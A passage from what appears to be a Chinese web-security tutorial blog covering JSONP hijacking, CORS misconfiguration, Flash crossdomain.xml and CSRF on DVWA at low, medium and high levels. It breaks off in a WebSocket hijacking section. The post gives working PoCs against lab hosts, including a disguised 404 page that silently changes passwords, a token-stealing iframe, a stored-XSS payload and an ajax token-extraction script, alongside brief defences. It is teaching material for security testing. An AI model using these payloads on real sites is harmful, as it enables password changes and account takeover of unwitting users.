+<h3 id="jsonp劫持"><a href="#jsonp劫持" class="headerlink" title="jsonp劫持"></a>jsonp劫持</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">JSONP（JSON with Padding）是数据格式JSON的一种“使用模式”，可以让网页从别的网域要数据。根据 XmlHttpRequest 对象受到同源策略的影响，而利用 &lt;script&gt;元素的这个开放策略，网页可以得到从其他来源动态产生的JSON数据，而这种使用模式就是所谓的 JSONP。用JSONP抓到的数据并不是JSON，而是任意的JavaScript，用 JavaScript解释器运行而不是用JSON解析器解析。所有，通过Chrome查看所有JSONP发送的Get请求都是js类型，而非XHR。</span><br><span class="line"> </span><br><span class="line">JSONP包含两部分：回调函数和数据。</span><br><span class="line">回调函数是当响应到来时要放在当前页面被调用的函数。</span><br><span class="line">数据就是传入回调函数中的json数据，也就是回调函数的参数了。</span><br></pre></td></tr></table></figure>
+<p>jsonp劫持只需要有这个参数，再去读取这个参数就可以进行jsonp劫持了</p>
+<p>jsonp劫持测试</p>
+<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1571403076.19.png" alt=""></p>
+<p>jsonp劫持在实际中也像上图这样调用返回一些信息，挖掘的时候利用如<script>标签跨域加载恶意的构造的语句即可劫持获取相应的信息</p>
+<p>Poc如下所示:测试时只需要修改函数名test，以及劫持的地址即可，可以使用key写的pocbox,方便快捷</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params">data</span>)</span>&#123; alert(<span class="built_in">JSON</span>.stringify(data)) &#125;&lt;<span class="regexp">/script&gt; &lt;script src="http:/</span><span class="regexp">/127.0.0.1/</span>DoraBox/csrf/jsonp.php?callback=test<span class="string">"&gt;&lt;/script&gt;</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1571403500.71.png" alt=""><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1571403521.67.png" alt=""></p>
+<p>组合拳：<a href="https://xz.aliyun.com/t/5143">JSONP绕过CSRF防护token </a></p>
+<p>如果可以读取页面的CSRF-token,则可以自动加入触发写类型的CSRF，同时jsonp不只可以触发csrf漏洞，由于跨域标签，还可能会触发xss漏洞<code>?callback=&lt;script&gt;alert(1111)&lt;/script&gt;</code></p>
+<p>修复方式：</p>
+<ol>
+<li>打乱响应主体内容</li>
+<li>禁止用户自定义callback函数</li>
+<li>Referer等进行限制</li>
+<li>严格按照json标准输出 Content-Type 及编码（ Content-Type : application/json; charset=utf-8 ）</li>
+</ol>
+<h3 id="CORS跨域资源共享"><a href="#CORS跨域资源共享" class="headerlink" title="CORS跨域资源共享"></a>CORS跨域资源共享</h3><blockquote>
+<p>Cross-Origin Resource Sharing（CORS）跨域资源共享是一份浏览器技术的规范，提供了 Web 服务从不同域传来沙盒脚本的方法，以避开浏览器的同源策略，确保安全的跨域数据传输。现代浏览器使用CORS在API容器如XMLHttpRequest来减少HTTP请求的风险来源。与 JSONP 不同，CORS 除了 GET 要求方法以外也支持其他的 HTTP 要求。 和jsonp的作用差不多，只不过是方式有所改变，那么我们在这个漏洞中的关键点就是Orgin这个参数的传递了，有时候我们需要自己添加有时候他有，而有时候他会通过某些参数传递 。</p>
+</blockquote>
+<p>CORS测试</p>
+<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1571405767.78.png" alt=""></p>
+<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1571403804.38.png" alt=""></p>
+<p>如上如图，在实际的测试中，如果在返回包中出现 Access-Control-Allow-*等响应头信息则时CORS跨域设置，尝试<script>标签等配合XMLHttpRequest劫持获取信息。<strong>在测试的时候亲请求头中添加Origin: <a href="http://xxx.com,看返回包中的响应头是否可控，在这里时允许http://www.lsowl.top请求的，所以就允许跨域读取此网址的内容。">http://xxx.com,看返回包中的响应头是否可控，在这里时允许http://www.lsowl.top请求的，所以就允许跨域读取此网址的内容。</a> <code>Origin</code>和<code>Referer</code>很相似，就是将当前的请求参数删除，仅剩下</strong>三元组（协议 主机 端口）<strong>，标准的浏览器（IE浏览器除外，IE浏览器只带在协议和主机），会在每次请求中都带上<code>Origin</code>，至少在跨域操作时肯定携带（例如ajax的操作） </strong></p>
+<p>POC如下(利用pocbox生成)</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;CORS TEST&lt;<span class="regexp">/title&gt;</span></span><br><span class="line"><span class="regexp">&lt;/</span>head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;div id=<span class="string">'output'</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">    &lt;script type=<span class="string">"text/javascript"</span>&gt;</span><br><span class="line">            <span class="keyword">var</span> req = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">            req.onload = reqListener;</span><br><span class="line">            req.open(<span class="string">'get'</span>,<span class="string">'http://127.0.0.1/DoraBox/csrf/userinfo.php '</span>,<span class="literal">true</span>);</span><br><span class="line">            <span class="comment">//req.setRequestHeader("Content-Type","application/x-www-form-urlencoded;");</span></span><br><span class="line">            req.withCredentials = <span class="literal">true</span>;</span><br><span class="line">            req.send();</span><br><span class="line">            <span class="function"><span class="keyword">function</span> <span class="title">reqListener</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">                <span class="keyword">var</span> output = <span class="built_in">document</span>.getElementById(<span class="string">'output'</span>);</span><br><span class="line">                output.innerHTML = <span class="string">"URL: http://127.0.0.1/DoraBox/csrf/userinfo.php &lt;br&gt;&lt;br&gt;Response:&lt;br&gt;&lt;textarea style='width: 659px; height: 193px;'&gt;"</span> + req.responseText + <span class="string">"&lt;/textarea&gt;"</span>;</span><br><span class="line">            &#125;;</span><br><span class="line">    &lt;<span class="regexp">/script&gt;</span></span><br><span class="line"><span class="regexp">&lt;/</span>body&gt;</span><br><span class="line">&lt;<span class="regexp">/html&gt;</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1571404697.35.png" alt=""><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1571404749.23.png" alt=""></p>
+<p><strong>利用CrossSiteContentHijacking测试</strong></p>
+<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1571479827.75.png" alt=""></p>
+<p>防御：</p>
+<p>加强对Origin的验证，即对cors进行严格的设置</p>
+<h3 id="Flash跨域"><a href="#Flash跨域" class="headerlink" title="Flash跨域"></a>Flash跨域</h3><blockquote>
+<p>Flash跨域比较经典了，在做web目录资产整理的时候有时候会发现这样的文件 <strong>crossdomain.xml</strong> ，文件内容如果是如下的，那么就存在Flash跨域问题，如下内容的意思是支持所有域。flash跨域是通过.swf文件进行的，流程是：lsowl.top存在测试的swf文件想要跨域获取target.com中的敏感数据信息，首先会寻找target.com是否存在 <strong>crossdomain.xml</strong>  ，如果存在则会查看是否允许lsowl.top访问，如果可以访问则存在flash跨域漏洞。</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;cross-domain-policy&gt;</span><br><span class="line">  &lt;allow-access-from domain=&quot;*&quot; /&gt;</span><br><span class="line">&lt;/cross-domain-policy&gt;</span><br></pre></td></tr></table></figure>
+<p>漏洞挖掘：由于没有找到测试的站点，所以文字描述，碰见存在<strong>crossdomain.xml</strong> 的站，访问看一下配置，再找找有无数据接口，然后利用POC <a href="https://github.com/nccgroup/CrossSiteContentHijacking/raw/master/ContentHijacking/objects/ContentHijacking.swf">https://github.com/nccgroup/CrossSiteContentHijacking/raw/master/ContentHijacking/objects/ContentHijacking.swf</a> 进行测试，或者是key师傅的<a href="https://github.com/Acmesec/PoCBox">pocbox</a></p>
+<p>emm,没图，用key师傅的图<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1571406720.75.png" alt=""></p>
+<p>防御：</p>
+<p>修改<strong>crossdomain.xml</strong>限制访问来源</p>
+<p>利用DVWA进行CSRF验证</p>
+<blockquote>
+<p>DVWA这里关于CSRF的漏洞点是重置密码</p>
+</blockquote>
+<h4 id="low级别"><a href="#low级别" class="headerlink" title="low级别"></a>low级别<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1527386809.77.png" alt=""><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1527386943.9.png" alt=""><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1527389971.67.png" alt=""></h4><p>可以看到DVWA关于CSRF漏洞的出发点是GET请求，并且分析源码发现后台并没有任何过滤，直接出发CSRF漏洞</p>
+<h5 id="方式一：直接构造链接，诱导用户点击（这种方式明显可以将链接转换为短链接）"><a href="#方式一：直接构造链接，诱导用户点击（这种方式明显可以将链接转换为短链接）" class="headerlink" title="方式一：直接构造链接，诱导用户点击（这种方式明显可以将链接转换为短链接）"></a>方式一：直接构造链接，诱导用户点击（这种方式明显可以将链接转换为短链接）</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.106/vulnerabilities/csrf/?password_new=attack&amp;password_conf=attack&amp;Change=Change#</span><br></pre></td></tr></table></figure>
+<h5 id="方式二：构造一个伪装的页面，可信度更高一点-放在这一台用户可以访问且攻击者可控的机器上，生成连接配合前面说的短链接诱导用户访问，如果没有跨域、token那些限制就可以直接触发，否则需要绕过"><a href="#方式二：构造一个伪装的页面，可信度更高一点-放在这一台用户可以访问且攻击者可控的机器上，生成连接配合前面说的短链接诱导用户访问，如果没有跨域、token那些限制就可以直接触发，否则需要绕过" class="headerlink" title="方式二：构造一个伪装的页面，可信度更高一点(放在这一台用户可以访问且攻击者可控的机器上，生成连接配合前面说的短链接诱导用户访问，如果没有跨域、token那些限制就可以直接触发，否则需要绕过)"></a>方式二：构造一个伪装的页面，可信度更高一点(放在这一台用户可以访问且攻击者可控的机器上，生成连接配合前面说的短链接诱导用户访问，如果没有跨域、token那些限制就可以直接触发，否则需要绕过)</h5><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"http://192.168.1.106/vulnerabilities/csrf/?password_new=attack&amp;password_conf=attack&amp;Change=Change#"</span> <span class="attr">border</span>=<span class="string">"0"</span> <span class="attr">style</span>=<span class="string">"display:none;"</span>/&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>404<span class="tag">&lt;<span class="name">h1</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>file not found.<span class="tag">&lt;<span class="name">h2</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1568860685.1.png" alt=""></p>
+<p>当诱导用户点击过后CSRF已经触发，密码已经被修改</p>
+<h5 id="方式三：使用burp的CSRF验证功能（自动生成表单的方式提交测试）"><a href="#方式三：使用burp的CSRF验证功能（自动生成表单的方式提交测试）" class="headerlink" title="方式三：使用burp的CSRF验证功能（自动生成表单的方式提交测试）"></a>方式三：使用burp的CSRF验证功能（自动生成表单的方式提交测试）<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1568861050.58.png" alt=""></h5><p>两种方式，在burp代理的情况下直接在浏览器中可以测试，或者可以将生成的POC(自己可以修改)复制下来，通过链接的形式来访问<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1568861215.33.png" alt=""></p>
+<p>可以发现密码已经修改</p>
+<h4 id="medium级别"><a href="#medium级别" class="headerlink" title="medium级别"></a>medium级别</h4><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1568861395.6.png" alt=""></p>
+<p>用之前的POC进行触发发现漏洞无法触发，根据提示查看源码，发现源码对于referer头进行了限制，显示了server_name，这里就是本地的地址</p>
+<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1568861469.09.png" alt=""></p>
+<p>所以这里的思路就是必须要在点击构造好的链接，数据包中的referer要包含192.168.1.106，所以，将之前的POC复制下来，然后新建一个HTML，命名为192.168.1.106.html,让模拟攻击者放在可控服务器上，让用户访问(注意，burpsuit的POC注释掉history.pushState函数，否则无法在referer头中添加server_name)</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="comment">/*history.pushState('', '', '/')*/</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"http://192.168.1.106/vulnerabilities/csrf/"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"password&amp;#95;new"</span> <span class="attr">value</span>=<span class="string">"admin888"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"password&amp;#95;conf"</span> <span class="attr">value</span>=<span class="string">"admin888"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"Change"</span> <span class="attr">value</span>=<span class="string">"Change"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"Submit request"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1568862110.62.png" alt=""><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1568862136.12.png" alt=""></p>
+<p>可以看到：referer头限制成功绕过，漏洞触发。</p>
+<h4 id="high级别"><a href="#high级别" class="headerlink" title="high级别"></a>high级别</h4><h5 id="方法一：结合存储型xss"><a href="#方法一：结合存储型xss" class="headerlink" title="方法一：结合存储型xss"></a>方法一：结合存储型xss</h5><p>点击修改密码后抓取数据包如下<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1568862268.49.png" alt=""></p>
+<p>可以发现在请求中多了user_token,这样就可以使得csrf失效了，查看源码确认判断<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1568862497.23.png" alt=""></p>
+<p>怎么绕过呢，思路：在请求前获取到服务端下发的token，然后带入请求劫持用户操作，触发CSRF，将POC构造为一下可以获取user_token。攻击思路是当受害者点击进入这个页面，脚本会通过一个看不见框架偷偷访问修改密码的页面，获取页面中的token，并向服务器发送改密请求，以完成CSRF攻击。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line"> </span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;script type=<span class="string">"text/javascript"</span>&gt;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">attack</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="built_in">document</span>.getElementsByName(<span class="string">'user_token'</span>)[<span class="number">0</span>].value = <span class="built_in">document</span>.getElementById(<span class="string">"hack"</span>).contentWindow.document.getElementsByName(<span class="string">'user_token'</span>)[<span class="number">0</span>].value;</span><br><span class="line">            <span class="built_in">document</span>.getElementById(<span class="string">"transfer"</span>).submit();</span><br><span class="line">        &#125;</span><br><span class="line">    &lt;<span class="regexp">/script&gt;</span></span><br><span class="line"><span class="regexp"> </span></span><br><span class="line"><span class="regexp">    &lt;iframe src="http:/</span><span class="regexp">/192.168.1.106/</span>vulnerabilities/csrf<span class="string">" id="</span>hack<span class="string">" border="</span><span class="number">0</span><span class="string">" style="</span>display:none;<span class="string">"&gt;&lt;/iframe&gt;</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">    &lt;body onload="</span>attack()<span class="string">"&gt;</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">        &lt;form method="</span>GET<span class="string">" id="</span>transfer<span class="string">" action="</span>http:<span class="comment">//192.168.1.106/vulnerabilities/csrf"&gt;</span></span><br><span class="line"> </span><br><span class="line">            &lt;input type=<span class="string">"hidden"</span> name=<span class="string">"password_new"</span> value=<span class="string">"attack"</span>&gt;</span><br><span class="line"> </span><br><span class="line">            &lt;input type=<span class="string">"hidden"</span> name=<span class="string">"password_conf"</span> value=<span class="string">"attack"</span>&gt;</span><br><span class="line"> </span><br><span class="line">            &lt;input type=<span class="string">"hidden"</span> name=<span class="string">"user_token"</span> value=<span class="string">""</span>&gt;</span><br><span class="line"> </span><br><span class="line">            &lt;input type=<span class="string">"hidden"</span> name=<span class="string">"Change"</span> value=<span class="string">"Change"</span>&gt;</span><br><span class="line"> </span><br><span class="line">        &lt;<span class="regexp">/form&gt;</span></span><br><span class="line"><span class="regexp">    &lt;/</span>body&gt;</span><br><span class="line"> </span><br><span class="line">&lt;<span class="regexp">/html&gt;</span></span><br></pre></td></tr></table></figure>
+<p>测试一下：<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1568869029.13.png" alt=""></p>
+<p>为什么会出现这种情况：因为现在的浏览器、基本都不会允许跨域的操作，我们的框架iframe访问的地址是<a href="http://192.168.1.106/vulnerabilities/csrf">http://192.168.1.106/vulnerabilities/csrf</a>，位于服务器192.168.1.106上，而我们的攻击页面位于黑客服务器192.168.1.101上，两者的域名不同，域名B下的所有页面都不被允许主动获取域名A下的页面内容，除非域名A下的页面主动发送信息给域名B的页面，所以我们的攻击脚本是不可能取到改密界面中的user_token。</p>
+<p>理想和现实的差距是比较大的，这次直接在目标站点上放上POC测试(不跨域的情况下，当然，既然能上传了，还挖什么CSRF呀，手动滑稽)<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1568869404.4.png" alt=""><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1568869465.77.png" alt=""></p>
+<p>可以看到，在理想情况下，成功获取到user_token,触发CSRF漏洞，将用户密码改为admin888</p>
+<p><strong>理想情况测试完后，想想怎么绕过：组合漏洞，通过XSS获取用户的user_token，然后结合CSRF触发</strong></p>
+<p>首先在存储型XSS的name处注入代码，触发存储型XSS漏洞，弹出user_token</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe src=<span class="string">"../csrf"</span> onload=alert(frames[<span class="number">0</span>].document.getElementsByName(<span class="string">"user_token"</span>)[<span class="number">0</span>].value)&gt;</span><br></pre></td></tr></table></figure>
+<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1568872357.86.png" alt=""><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1568872377.73.png" alt=""></p>
+<p>可以看到代码已经注入进去了，利用存储型XSS获取user_token,然后在CSRF处修改密码抓包生成POC替换user_token值既可触发CSRF漏洞<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1568872555.58.png" alt=""><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1568872610.87.png" alt=""><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1568872638.08.png" alt=""></p>
+<p>可以看到漏洞触发，密码被修改。</p>
+<h5 id="方法二：结合xss调用外链通过ajax实现CSRF（没实现，后面补上）"><a href="#方法二：结合xss调用外链通过ajax实现CSRF（没实现，后面补上）" class="headerlink" title="方法二：结合xss调用外链通过ajax实现CSRF（没实现，后面补上）"></a>方法二：结合xss调用外链通过ajax实现CSRF（没实现，后面补上）</h5><p>CSRF结合同Security Level的 XSS漏洞，通过ajax实现跨域请求来获取用户的user_token</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">alert(<span class="built_in">document</span>.cookie);</span><br><span class="line"><span class="keyword">var</span> theUrl = <span class="string">'http://192.168.1.106/vulnerabilities/csrf/'</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">window</span>.XMLHttpRequest) &#123;</span><br><span class="line">    xmlhttp = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    xmlhttp = <span class="keyword">new</span> ActiveXObject(<span class="string">"Microsoft.XMLHTTP"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> count = <span class="number">0</span>;</span><br><span class="line">xmlhttp.withCredentials = <span class="literal">true</span>;</span><br><span class="line">xmlhttp.onreadystatechange=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(xmlhttp.readyState ==<span class="number">4</span> &amp;&amp; xmlhttp.status==<span class="number">200</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">var</span> text = xmlhttp.responseText;</span><br><span class="line">        <span class="keyword">var</span> regex = <span class="regexp">/user_token\' value\=\'(.*?)\' \/\&gt;/</span>;</span><br><span class="line">        <span class="keyword">var</span> match = text.match(regex);</span><br><span class="line">        <span class="built_in">console</span>.log(match);</span><br><span class="line">        alert(match[<span class="number">1</span>]);</span><br><span class="line">            <span class="keyword">var</span> token = match[<span class="number">1</span>];</span><br><span class="line">                <span class="keyword">var</span> new_url = <span class="string">'http://192.168.1.106/vulnerabilities/csrf/?user_token='</span>+token+<span class="string">'&amp;password_new=test&amp;password_conf=test&amp;Change=Change'</span>;</span><br><span class="line">                <span class="keyword">if</span>(count==<span class="number">0</span>)&#123;</span><br><span class="line">                    count++;</span><br><span class="line">                    xmlhttp.open(<span class="string">"GET"</span>,new_url,<span class="literal">false</span>);</span><br><span class="line">                    xmlhttp.send();</span><br><span class="line">                &#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line">xmlhttp.open(<span class="string">"GET"</span>,theUrl,<span class="literal">false</span>);</span><br><span class="line">xmlhttp.send();</span><br></pre></td></tr></table></figure>
+<h4 id="Tips"><a href="#Tips" class="headerlink" title="Tips:"></a>Tips:</h4><blockquote>
+<p>在前面dvwa的high等级中，对于csrf的防御点就在于user_token，通过token可以进行身份鉴别，当然，在没有登录的情况下只能通过组合漏洞获取token或者看看有没有token泄露；除此之外，token在登录的情况下(即以及获取到token的情况下)除了身份鉴别之外，还可以防止重放，因为数据包的重放每次都要更新token，所以在以token为重放判定的情况下，怎么不断重新获取token呢，当然不能手动获取，burp上有插件实现了cookie的更新(有些情况是把token加在cookie中的)，但是对于没有在cookie中的token，可以通过CSRF Token Tracker插件实现自动更新，表面意思是只能更新csrf——token，其实都可以。这样在某些场景，比如短信轰炸啥的就可以突破了，还有些服务端有下发sign的情况，这种插件目前没有发现。</p>
+</blockquote>
+<p>以dvwa中CSRF的high等级为例</p>
+<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1568875700.86.png" alt=""></p>
+<p>没有更新token时修改密码重放<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1568875765.59.png" alt=""><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1568876011.68.png" alt=""></p>
+<p>实时更新token测试<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1568875932.29.png" alt=""></p>
+<h2 id="可读可写型CSRF"><a href="#可读可写型CSRF" class="headerlink" title="可读可写型CSRF"></a>可读可写型CSRF</h2><blockquote>
+<p>WebSocket 跨域劫持漏洞,由于websocket协议支持双通道通信且websocket不受同源策略的影响，利用websocket的跨域劫持为可读可写类型</p>
+</blockquote>
+<h3 id="websocket的优点"><a href="#websocket的优点" class="headerlink" title="websocket的优点"></a>websocket的优点</h3><ul>
+<li>支持全双工，实时性更强。</li>
+<li>更好的二进制支持。</li>
+<li>较少的控制开销。连接创建后，ws客户端、服务端进行数据交换时，协议控制的数据包头部较小。在不包含头部的情况下，服务端到客户端的包头只有2~10字节（取决于数据包长度），客户端到服务端的话，需要加上额外4字节的掩码。而HTTP协议每次通信都需要携带完整的头部。</li>
+<li>支持扩展。ws协议定义了扩展，用户可以扩展协议，或者实现自定义的子协议。（比如支持自定义压缩算法等）</li>
+</ul>
+<h3 id="websocket就建立链接如下"><a href="#websocket就建立链接如下" class="headerlink" title="websocket就建立链接如下"></a>websocket就建立链接如下<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1571476121.43.png" alt=""></h3><p>通过建立连接的过程可以发现在websocket建立连接时没有进行验证，所以由此产生漏洞。</p>
+<p><a href="https://github.com/chyingp/blog/tree/master/demo/2017.05.22-web-socket/ws">测试环境用到代码如下</a></p>
+<p><strong>server.js</strong></p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//server.js</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">var</span> app = <span class="built_in">require</span>(<span class="string">'express'</span>)();</span><br><span class="line"><span class="keyword">var</span> server = <span class="built_in">require</span>(<span class="string">'http'</span>).Server(app);</span><br><span class="line"><span class="keyword">var</span> WebSocket = <span class="built_in">require</span>(<span class="string">'ws'</span>);</span><br><span class="line"> </span><br><span class="line"><span class="keyword">var</span> wss = <span class="keyword">new</span> WebSocket.Server(&#123; <span class="attr">port</span>: <span class="number">9999</span> &#125;);</span><br><span class="line"> </span><br><span class="line">wss.on(<span class="string">'connection'</span>, <span class="function"><span class="keyword">function</span> <span class="title">connection</span>(<span class="params">ws</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'server: receive connection.'</span>);</span><br><span class="line"> </span><br><span class="line">    ws.on(<span class="string">'message'</span>, <span 